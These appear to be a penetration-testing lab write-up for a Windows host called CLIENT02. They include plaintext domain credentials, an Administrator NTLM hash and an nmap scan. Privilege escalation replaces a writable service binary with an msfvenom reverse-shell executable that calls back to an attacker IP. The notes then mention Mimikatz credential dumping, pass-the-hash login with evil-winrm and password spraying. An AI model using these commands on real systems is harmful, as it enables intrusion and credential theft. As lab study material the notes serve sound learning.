# CLIENT02 .83 \[W, Pwned]

## Domain Users

`wario:Mushroom!`

`yoshi:Mushroom!`

toad

daisy

## Enumeration

```
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Ports

Port specific enumeration&#x20;

### Local Users

<pre class="language-ruby"><code class="lang-ruby"><strong>Administrator:00fd074ec24fd70c76727ee9b2d7aacd
</strong></code></pre>

## Initial Foothold

'wario' has RDP access to this machine.

'DevelopmentExecutables' on C:, sus.

WinPEAS show service AuditTracker which we have full access over the exe.

## PrivEsc

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=443 -f exe -o auditTracker.exe
sc.exe start auditTracker
```

## Post Exploitation

Mimikatz get Admin password

```
evil-winrm -i 172.16.187.83 -u Administrator -H 00fd074ec24fd70c76727ee9b2d7aacd
```

```
C:\Users\administrator.MEDTECH\Documents\Security\Templates> type service.inf
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
[Service General Setting]
"auditTracker",2,"D:AR(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCLCSWLOCRRC;;;IU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-976142013-3766213998-138799841-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```

Password spraying for all users we've found so far:

`yoshi:Mushroom!`
